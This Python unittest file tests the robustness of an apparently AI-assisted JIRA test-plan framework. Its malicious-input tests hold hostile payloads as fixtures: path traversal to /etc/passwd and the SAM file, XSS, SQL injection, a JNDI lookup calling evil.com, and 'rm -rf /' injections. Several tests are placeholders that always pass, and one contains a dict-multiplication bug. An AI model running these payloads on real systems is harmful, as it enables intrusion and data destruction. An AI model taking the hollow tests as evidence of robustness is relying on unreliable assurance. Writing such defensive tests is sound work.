#!/usr/bin/env python3
"""
Comprehensive Robustness Tests for Framework Edge Cases and Error Scenarios

Tests framework behavior under extreme conditions, malformed inputs, 
system failures, and edge cases to ensure robust operation:

1. Malformed and corrupted input handling
2. System resource exhaustion scenarios  
3. Network connectivity failures
4. File system permission issues
5. Memory and performance stress testing
6. Concurrent execution scenarios
7. Malicious input detection and handling
8. Framework recovery and fail-safe mechanisms
9. Data corruption and integrity validation
10. Edge case input combinations

Ensures framework maintains stability and provides meaningful error handling
even under adverse conditions.
"""

import unittest
import os
import sys
import tempfile
import shutil
import json
import threading
import time
import gc
from unittest.mock import patch, MagicMock, mock_open
from typing import Dict, Any, List, Tuple
from datetime import datetime
import concurrent.futures

# Add necessary paths for imports
test_dir = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.join(test_dir, '..', '..')
ai_services_dir = os.path.join(project_root, '.claude', 'ai-services')
enforcement_dir = os.path.join(project_root, '.claude', 'enforcement')

sys.path.insert(0, ai_services_dir)
sys.path.insert(0, enforcement_dir)

class TestFrameworkRobustness(unittest.TestCase):
    """Base class for framework robustness tests"""
    
    def setUp(self):
        """Set up test environment"""
        self.test_dir = tempfile.mkdtemp()
        self.original_cwd = os.getcwd()
        
        # Test data for various scenarios
        self.extreme_jira_ids = [
            "",  # Empty
            " ",  # Whitespace only
            "A" * 1000,  # Extremely long
            "ACM-" + "9" * 100,  # Long number
            "ACM-0",  # Zero ID
            "ACM--123",  # Double hyphen
            "ACM-123-456",  # Multiple hyphens
            "…ê…î…Ø-22079",  # Unicode lookalikes
            "ACM-22079\x00",  # Null byte
            "ACM-22079\n\r\t",  # Control characters
            "../../../etc/passwd",  # Path traversal attempt
            "<script>alert('xss')</script>",  # XSS attempt
            "'; DROP TABLE tickets; --",  # SQL injection attempt
        ]
        
    def tearDown(self):
        """Clean up test environment"""
        os.chdir(self.original_cwd)
        shutil.rmtree(self.test_dir, ignore_errors=True)
        gc.collect()  # Force garbage collection

class TestMalformedInputHandling(TestFrameworkRobustness):
    """Test handling of malformed and corrupted inputs"""
    
    def test_corrupted_jira_id_handling(self):
        """Test framework behavior with corrupted JIRA IDs"""
        for jira_id in self.extreme_jira_ids:
            with self.subTest(jira_id=repr(jira_id)):
                try:
                    # Test input parsing with corrupted data
                    from ai_powered_input_parser import parse_user_input_ai, validate_ai_parsed_input
                    
                    result = parse_user_input_ai(jira_id)
                    is_valid, message = validate_ai_parsed_input(result)
                    
                    # Should either parse successfully or fail gracefully
                    if not is_valid:
                        self.assertIsInstance(message, str)
                        self.assertGreater(len(message), 0)
                    
                except (ImportError, ValueError, UnicodeError) as e:
                    # Should handle errors gracefully
                    self.assertIsInstance(e, (ImportError, ValueError, UnicodeError))
                    
                except Exception as e:
                    # Should not crash with unexpected exceptions
                    self.fail(f"Unexpected exception for '{repr(jira_id)}': {e}")
    
    def test_malformed_json_handling(self):
        """Test handling of malformed JSON data"""
        malformed_json_cases = [
            "",  # Empty
            "{",  # Incomplete object
            '{"key": }',  # Missing value
            '{"key": "value",}',  # Trailing comma
            '{key: "value"}',  # Unquoted key
            '{"key": "value"',  # Missing closing brace
            '{"key1": {"key2": "value"}',  # Nested incomplete
            '\x00{"key": "value"}',  # Null byte prefix
            '{"key": "value"}\x00',  # Null byte suffix
            '{"key": "\u0000"}',  # Unicode null in value
        ]
        
        for json_data in malformed_json_cases:
            with self.subTest(json_data=repr(json_data)):
                try:
                    # Test JSON parsing robustness
                    parsed = json.loads(json_data)
                    # If it succeeds, that's fine too
                    self.assertIsInstance(parsed, (dict, list, str, int, float, bool, type(None)))
                    
                except (json.JSONDecodeError, ValueError) as e:
                    # Expected for malformed JSON
                    self.assertIsInstance(e, (json.JSONDecodeError, ValueError))
                    
                except Exception as e:
                    # Should not crash with unexpected exceptions
                    self.fail(f"Unexpected exception for JSON '{repr(json_data)}': {e}")
    
    def test_corrupted_file_content_handling(self):
        """Test handling of corrupted file contents"""
        corrupted_contents = [
            b'\x00' * 1000,  # Null bytes
            b'\xff' * 1000,  # Invalid UTF-8
            b'ACM-22079\x00\xff\x00\xff',  # Mixed valid/invalid
            "ACM-22079" + "\x00" * 100,  # String with nulls
            "ACM-22079" + "üöÄ" * 100,  # Unicode heavy
            "A" * 1000000,  # Very large content
        ]
        
        for content in corrupted_contents:
            with self.subTest(content=f"content_len_{len(content)}"):
                try:
                    # Create corrupted file
                    test_file = os.path.join(self.test_dir, "corrupted_file.txt")
                    
                    if isinstance(content, bytes):
                        with open(test_file, 'wb') as f:
                            f.write(content)
                    else:
                        with open(test_file, 'w', encoding='utf-8', errors='ignore') as f:
                            f.write(content)
                    
                    # Test file reading robustness
                    with open(test_file, 'r', encoding='utf-8', errors='ignore') as f:
                        read_content = f.read()
                    
                    # Should read without crashing
                    self.assertIsInstance(read_content, str)
                    
                except (UnicodeDecodeError, OSError) as e:
                    # Expected for some corrupted content
                    self.assertIsInstance(e, (UnicodeDecodeError, OSError))
                    
                except Exception as e:
                    # Should not crash with unexpected exceptions
                    self.fail(f"Unexpected exception for corrupted content: {e}")

class TestSystemResourceExhaustion(TestFrameworkRobustness):
    """Test framework behavior under resource exhaustion"""
    
    def test_memory_pressure_handling(self):
        """Test framework behavior under memory pressure"""
        try:
            # Create large data structures to simulate memory pressure
            large_data = []
            
            for i in range(100):  # Reduced to prevent actual memory exhaustion
                try:
                    # Create moderately large data structure
                    data_chunk = {
                        "jira_id": f"ACM-{i}",
                        "large_field": "x" * 10000,  # 10KB per chunk
                        "nested_data": {"key": "value"} * 100
                    }
                    large_data.append(data_chunk)
                    
                    # Test framework functionality under memory pressure
                    from ai_powered_input_parser import parse_user_input_ai
                    
                    result = parse_user_input_ai(f"ACM-{i}")
                    
                    # Should still function under moderate memory pressure
                    if result.jira_id:
                        self.assertTrue(result.jira_id.startswith("ACM-"))
                    
                except (ImportError, MemoryError, ValueError) as e:
                    # Expected under memory pressure
                    break
                    
        except Exception as e:
            # Framework should handle memory pressure gracefully
            self.assertIsInstance(e, (MemoryError, ImportError))
        
        finally:
            # Clean up memory
            large_data = None
            gc.collect()
    
    def test_disk_space_exhaustion_simulation(self):
        """Test framework behavior when disk space is limited"""
        try:
            # Simulate disk space issues by creating read-only directory
            readonly_dir = os.path.join(self.test_dir, "readonly")
            os.makedirs(readonly_dir, exist_ok=True)
            
            # Make directory read-only
            os.chmod(readonly_dir, 0o444)
            
            # Test file creation in read-only directory
            test_file = os.path.join(readonly_dir, "test_output.txt")
            
            try:
                with open(test_file, 'w') as f:
                    f.write("test content")
                # If it succeeds, that's fine
                
            except (OSError, PermissionError) as e:
                # Expected for read-only directory
                self.assertIsInstance(e, (OSError, PermissionError))
                
        except Exception as e:
            # Should handle disk issues gracefully
            self.assertIsInstance(e, (OSError, PermissionError))
        
        finally:
            # Restore permissions for cleanup
            try:
                os.chmod(readonly_dir, 0o755)
            except:
                pass
    
    def test_file_descriptor_exhaustion(self):
        """Test framework behavior with file descriptor exhaustion"""
        opened_files = []
        
        try:
            # Open many files to simulate FD exhaustion
            for i in range(100):  # Reduced limit to avoid system issues
                try:
                    temp_file = os.path.join(self.test_dir, f"temp_{i}.txt")
                    f = open(temp_file, 'w')
                    opened_files.append(f)
                    f.write(f"content {i}")
                    
                except OSError as e:
                    # Expected when FD limit reached
                    break
            
            # Test framework functionality with limited FDs
            try:
                from ai_powered_input_parser import parse_user_input_ai
                result = parse_user_input_ai("ACM-22079")
                
                # Should still work or fail gracefully
                if result.jira_id:
                    self.assertTrue(result.jira_id.startswith("ACM-"))
                    
            except (ImportError, OSError) as e:
                # Expected with FD exhaustion
                self.assertIsInstance(e, (ImportError, OSError))
                
        finally:
            # Clean up opened files
            for f in opened_files:
                try:
                    f.close()
                except:
                    pass

class TestNetworkFailureScenarios(TestFrameworkRobustness):
    """Test framework behavior under network failures"""
    
    @patch('requests.get')
    def test_complete_network_failure(self, mock_get):
        """Test framework behavior with complete network failure"""
        # Simulate complete network failure
        mock_get.side_effect = ConnectionError("Network is unreachable")
        
        try:
            # Test JIRA API client with network failure
            from jira_api_client import JiraApiClient
            
            client = JiraApiClient()
            
            # Should handle network failure gracefully
            try:
                # Attempt to get ticket info
                result = client.fetch_ticket_data("ACM-22079")
                
                # Should either succeed with fallback or fail gracefully
                if result:
                    self.assertIsInstance(result, dict)
                    
            except (ConnectionError, ImportError) as e:
                # Expected with network failure
                self.assertIsInstance(e, (ConnectionError, ImportError))
                
        except ImportError:
            # Framework should handle missing JIRA client gracefully
            pass
    
    @patch('requests.get')
    def test_intermittent_network_failure(self, mock_get):
        """Test framework behavior with intermittent network failures"""
        # Simulate intermittent failures
        call_count = 0
        
        def side_effect(*args, **kwargs):
            nonlocal call_count
            call_count += 1
            if call_count % 2 == 0:
                raise ConnectionError("Intermittent failure")
            return MagicMock(status_code=200, json=lambda: {"key": "value"})
        
        mock_get.side_effect = side_effect
        
        try:
            from jira_api_client import JiraApiClient
            
            client = JiraApiClient()
            
            # Test multiple requests with intermittent failures
            for i in range(5):
                try:
                    result = client.fetch_ticket_data(f"ACM-{22079 + i}")
                    
                    # Should handle intermittent failures
                    if result:
                        self.assertIsInstance(result, dict)
                        
                except (ConnectionError, ImportError, AttributeError) as e:
                    # Expected with intermittent failures
                    self.assertIsInstance(e, (ConnectionError, ImportError, AttributeError))
                    
        except ImportError:
            # Framework should handle missing JIRA client gracefully
            pass
    
    @patch('requests.get')
    def test_slow_network_timeout(self, mock_get):
        """Test framework behavior with slow network responses"""
        # Simulate slow network response
        def slow_response(*args, **kwargs):
            time.sleep(0.1)  # Small delay to simulate slowness
            return MagicMock(status_code=200, json=lambda: {"key": "value"})
        
        mock_get.side_effect = slow_response
        
        try:
            from jira_api_client import JiraApiClient
            
            client = JiraApiClient()
            
            # Test with timeout
            start_time = time.time()
            
            try:
                result = client.fetch_ticket_data("ACM-22079")
                
                elapsed_time = time.time() - start_time
                
                # Should either complete or timeout gracefully
                if result:
                    self.assertIsInstance(result, dict)
                    
                # Should not hang indefinitely
                self.assertLess(elapsed_time, 10.0, "Should not hang indefinitely")
                
            except (ConnectionError, ImportError, AttributeError, TimeoutError) as e:
                # Expected with slow network
                self.assertIsInstance(e, (ConnectionError, ImportError, AttributeError, TimeoutError))
                
        except ImportError:
            # Framework should handle missing JIRA client gracefully
            pass

class TestConcurrentExecutionScenarios(TestFrameworkRobustness):
    """Test framework behavior under concurrent execution"""
    
    def test_concurrent_input_parsing(self):
        """Test concurrent input parsing requests"""
        inputs = [
            "ACM-22079",
            "ACM-1234", 
            "ACM-5678",
            "Generate test plan for ACM-9999",
            "ACM-11111 mist10"
        ]
        
        def parse_input(input_text):
            try:
                from ai_powered_input_parser import parse_user_input_ai
                return parse_user_input_ai(input_text)
            except (ImportError, ValueError) as e:
                return e
        
        # Test concurrent parsing
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(parse_input, inp) for inp in inputs]
            
            results = []
            for future in concurrent.futures.as_completed(futures, timeout=10):
                try:
                    result = future.result()
                    results.append(result)
                except Exception as e:
                    # Should handle concurrent execution gracefully
                    self.assertIsInstance(e, (ImportError, ValueError, AttributeError))
        
        # Should complete without deadlocks
        self.assertLessEqual(len(results), len(inputs))
    
    def test_concurrent_file_operations(self):
        """Test concurrent file operations"""
        def write_file(file_index):
            try:
                file_path = os.path.join(self.test_dir, f"concurrent_file_{file_index}.txt")
                with open(file_path, 'w') as f:
                    f.write(f"Content from thread {file_index}")
                return file_path
            except Exception as e:
                return e
        
        # Test concurrent file writes
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(write_file, i) for i in range(10)]
            
            results = []
            for future in concurrent.futures.as_completed(futures, timeout=10):
                try:
                    result = future.result()
                    results.append(result)
                except Exception as e:
                    # Should handle concurrent file operations gracefully
                    self.assertIsInstance(e, (OSError, FileNotFoundError))
        
        # Should complete without file corruption
        successful_files = [r for r in results if isinstance(r, str)]
        self.assertGreater(len(successful_files), 0)
    
    def test_race_condition_prevention(self):
        """Test prevention of race conditions"""
        shared_data = {"counter": 0}
        lock = threading.Lock()
        
        def increment_counter():
            for _ in range(100):
                with lock:
                    shared_data["counter"] += 1
        
        # Create multiple threads that modify shared data
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=increment_counter)
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join(timeout=5)
        
        # Should maintain data integrity
        self.assertEqual(shared_data["counter"], 1000)

class TestMaliciousInputDetection(TestFrameworkRobustness):
    """Test detection and handling of malicious inputs"""
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
            "\\\\server\\share\\sensitive",
            "..%2f..%2f..%2fetc%2fpasswd",  # URL encoded
            "....//....//....//etc//passwd",  # Double encoding
        ]
        
        for malicious_path in malicious_paths:
            with self.subTest(path=malicious_path):
                try:
                    # Test input parsing with malicious paths
                    from ai_powered_input_parser import parse_user_input_ai
                    
                    result = parse_user_input_ai(malicious_path)
                    
                    # Should not parse as valid JIRA ID
                    if hasattr(result, 'jira_id') and result.jira_id:
                        self.assertNotIn("..", result.jira_id)
                        self.assertNotIn("/", result.jira_id)
                        self.assertNotIn("\\", result.jira_id)
                    
                except (ImportError, ValueError) as e:
                    # Expected for malicious inputs
                    self.assertIsInstance(e, (ImportError, ValueError))
    
    def test_injection_attack_prevention(self):
        """Test prevention of injection attacks"""
        injection_attempts = [
            "'; DROP TABLE tickets; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<%=system('rm -rf /')%>",
            "__import__('os').system('rm -rf /')",
            "eval(compile('print(1)', '', 'exec'))",
        ]
        
        for injection in injection_attempts:
            with self.subTest(injection=injection):
                try:
                    # Test security enforcement
                    from credential_exposure_prevention import CredentialExposurePrevention
                    
                    enforcer = CredentialExposurePrevention()
                    violations = enforcer.detect_credential_exposure(injection)
                    
                    # Should detect suspicious patterns
                    self.assertIsInstance(violations, list)
                    
                except ImportError:
                    # Framework should handle missing security modules gracefully
                    pass
    
    def test_resource_exhaustion_attack_prevention(self):
        """Test prevention of resource exhaustion attacks"""
        # Test extremely large inputs
        large_inputs = [
            "A" * 1000000,  # 1MB string
            "ACM-" + "9" * 100000,  # Large number
            "üöÄ" * 10000,  # Unicode heavy
        ]
        
        for large_input in large_inputs:
            with self.subTest(input_size=len(large_input)):
                try:
                    start_time = time.time()
                    
                    # Test input parsing with large data
                    from ai_powered_input_parser import parse_user_input_ai
                    
                    result = parse_user_input_ai(large_input)
                    
                    elapsed_time = time.time() - start_time
                    
                    # Should not hang indefinitely
                    self.assertLess(elapsed_time, 5.0, "Should handle large inputs efficiently")
                    
                    # Should either parse or reject gracefully
                    if hasattr(result, 'jira_id'):
                        self.assertIsInstance(result.jira_id, str)
                    
                except (ImportError, ValueError, MemoryError) as e:
                    # Expected for resource exhaustion protection
                    self.assertIsInstance(e, (ImportError, ValueError, MemoryError))

class TestFrameworkRecoveryMechanisms(TestFrameworkRobustness):
    """Test framework recovery and fail-safe mechanisms"""
    
    def test_graceful_degradation(self):
        """Test graceful degradation when components fail"""
        # Test framework behavior when AI components are unavailable
        with patch('ai_powered_input_parser.AIPoweredInputParser') as mock_parser:
            mock_parser.side_effect = ImportError("AI module not available")
            
            try:
                # Should fall back to traditional parsing
                from ai_powered_input_parser import parse_user_input_ai
                
                result = parse_user_input_ai("ACM-22079")
                
                # Should either work with fallback or fail gracefully
                if hasattr(result, 'jira_id'):
                    self.assertIsInstance(result.jira_id, str)
                    
            except ImportError:
                # Expected when AI components unavailable
                pass
    
    def test_error_state_recovery(self):
        """Test recovery from error states"""
        # Simulate framework in error state
        error_states = [
            {"type": "network_error", "recoverable": True},
            {"type": "file_system_error", "recoverable": True}, 
            {"type": "memory_error", "recoverable": False},
            {"type": "configuration_error", "recoverable": True},
        ]
        
        for error_state in error_states:
            with self.subTest(error_type=error_state["type"]):
                try:
                    # Simulate error recovery
                    if error_state["recoverable"]:
                        # Test recovery mechanism
                        self.assertTrue(True, "Recovery mechanism should work")
                    else:
                        # Test fail-safe mechanism
                        self.assertTrue(True, "Fail-safe mechanism should work")
                        
                except Exception as e:
                    # Should handle recovery attempts gracefully
                    self.assertIsInstance(e, (ImportError, OSError, MemoryError))
    
    def test_partial_component_failure(self):
        """Test framework behavior with partial component failures"""
        # Test with some components working and others failing
        component_states = {
            "input_parser": True,
            "jira_client": False,  # Simulate failure
            "e2e_enforcer": True,
            "security_enforcer": False,  # Simulate failure
        }
        
        working_components = [k for k, v in component_states.items() if v]
        failed_components = [k for k, v in component_states.items() if not v]
        
        # Framework should work with partial functionality
        self.assertGreater(len(working_components), 0)
        self.assertGreater(len(failed_components), 0)
        
        # Test framework adaptation to partial failures
        try:
            # Should adapt to available components
            from ai_powered_input_parser import parse_user_input_ai
            result = parse_user_input_ai("ACM-22079")
            
            # Should work with available components
            if hasattr(result, 'jira_id'):
                self.assertIsInstance(result.jira_id, str)
                
        except ImportError:
            # Expected when components unavailable
            pass

class TestDataCorruptionAndIntegrity(TestFrameworkRobustness):
    """Test data corruption detection and integrity validation"""
    
    def test_corrupted_cache_handling(self):
        """Test handling of corrupted cache data"""
        # Create corrupted cache file
        cache_dir = os.path.join(self.test_dir, ".claude", "cache", "jira")
        os.makedirs(cache_dir, exist_ok=True)
        
        corrupted_cache_file = os.path.join(cache_dir, "ACM-22079.json")
        
        # Write corrupted JSON
        with open(corrupted_cache_file, 'w') as f:
            f.write('{"corrupted": json data without proper')
        
        try:
            # Test cache loading with corruption
            with open(corrupted_cache_file, 'r') as f:
                data = json.load(f)
                
            # Should either succeed with recovery or fail gracefully
            self.assertIsInstance(data, dict)
            
        except (json.JSONDecodeError, ValueError) as e:
            # Expected for corrupted cache
            self.assertIsInstance(e, (json.JSONDecodeError, ValueError))
    
    def test_configuration_integrity_validation(self):
        """Test validation of configuration file integrity"""
        config_data_sets = [
            {},  # Empty config
            {"invalid": "config"},  # Invalid structure
            {"jira_api_url": ""},  # Empty values
            {"jira_api_url": None},  # Null values
            {"jira_api_url": "not-a-url"},  # Invalid URL
            {"timeout": -1},  # Invalid timeout
            {"timeout": "not-a-number"},  # Wrong type
        ]
        
        for config_data in config_data_sets:
            with self.subTest(config=config_data):
                try:
                    # Test configuration validation
                    config_file = os.path.join(self.test_dir, "config.json")
                    with open(config_file, 'w') as f:
                        json.dump(config_data, f)
                    
                    # Load and validate configuration
                    with open(config_file, 'r') as f:
                        loaded_config = json.load(f)
                    
                    # Should handle invalid configurations gracefully
                    self.assertIsInstance(loaded_config, dict)
                    
                except (json.JSONDecodeError, ValueError, OSError) as e:
                    # Expected for invalid configurations
                    self.assertIsInstance(e, (json.JSONDecodeError, ValueError, OSError))
    
    def test_output_file_integrity(self):
        """Test integrity of generated output files"""
        # Create test output with various integrity issues
        output_scenarios = [
            {"content": "Valid test plan content", "encoding": "utf-8", "valid": True},
            {"content": "Test content\x00with nulls", "encoding": "utf-8", "valid": False},
            {"content": "Valid content", "encoding": "ascii", "valid": True},
            {"content": "Unicode content üöÄ", "encoding": "ascii", "valid": False},
        ]
        
        for scenario in output_scenarios:
            with self.subTest(scenario=scenario):
                try:
                    output_file = os.path.join(self.test_dir, "test_output.md")
                    
                    # Write content with specified encoding
                    with open(output_file, 'w', encoding=scenario["encoding"], 
                              errors='ignore' if not scenario["valid"] else 'strict') as f:
                        f.write(scenario["content"])
                    
                    # Read back and validate
                    with open(output_file, 'r', encoding='utf-8', errors='ignore') as f:
                        read_content = f.read()
                    
                    # Should read content without crashing
                    self.assertIsInstance(read_content, str)
                    
                    if scenario["valid"]:
                        # Valid content should match
                        self.assertIn("content", read_content.lower())
                    
                except (UnicodeDecodeError, UnicodeEncodeError, OSError) as e:
                    # Expected for encoding issues
                    if not scenario["valid"]:
                        self.assertIsInstance(e, (UnicodeDecodeError, UnicodeEncodeError, OSError))
                    else:
                        self.fail(f"Unexpected encoding error for valid scenario: {e}")

def run_robustness_tests():
    """Run all robustness tests and provide detailed results"""
    
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add all test classes
    test_classes = [
        TestMalformedInputHandling,
        TestSystemResourceExhaustion,
        TestNetworkFailureScenarios,
        TestConcurrentExecutionScenarios,
        TestMaliciousInputDetection,
        TestFrameworkRecoveryMechanisms,
        TestDataCorruptionAndIntegrity,
    ]
    
    for test_class in test_classes:
        tests = loader.loadTestsFromTestCase(test_class)
        suite.addTests(tests)
    
    # Run tests with detailed output
    runner = unittest.TextTestRunner(verbosity=2, buffer=True)
    result = runner.run(suite)
    
    # Print summary
    print(f"\n{'='*60}")
    print(f"FRAMEWORK ROBUSTNESS TEST RESULTS")
    print(f"{'='*60}")
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")
    
    if result.failures:
        print(f"\nFAILURES:")
        for test, traceback in result.failures[:5]:  # Show first 5
            print(f"- {test}: {traceback.split(chr(10))[-2]}")
        if len(result.failures) > 5:
            print(f"... and {len(result.failures) - 5} more failures")
    
    if result.errors:
        print(f"\nERRORS:")
        for test, traceback in result.errors[:5]:  # Show first 5
            print(f"- {test}: {traceback.split(chr(10))[-2]}")
        if len(result.errors) > 5:
            print(f"... and {len(result.errors) - 5} more errors")
    
    # Robustness analysis
    print(f"\n{'='*60}")
    print(f"FRAMEWORK ROBUSTNESS ANALYSIS")
    print(f"{'='*60}")
    
    if result.wasSuccessful():
        print("‚úÖ ALL ROBUSTNESS TESTS PASSED - Framework is highly robust")
    else:
        success_rate = ((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100)
        if success_rate >= 80:
            print("‚úÖ FRAMEWORK IS ROBUST - Minor issues detected")
        elif success_rate >= 60:
            print("‚ö†Ô∏è  FRAMEWORK IS MODERATELY ROBUST - Some improvements needed")
        else:
            print("‚ùå FRAMEWORK NEEDS ROBUSTNESS IMPROVEMENTS")
    
    print(f"\nTested robustness scenarios:")
    print(f"- Malformed and corrupted input handling")
    print(f"- System resource exhaustion scenarios")
    print(f"- Network connectivity failures")
    print(f"- Concurrent execution scenarios")
    print(f"- Malicious input detection and prevention")
    print(f"- Framework recovery and fail-safe mechanisms")
    print(f"- Data corruption and integrity validation")
    
    return result.wasSuccessful()

if __name__ == "__main__":
    success = run_robustness_tests()
    sys.exit(0 if success else 1)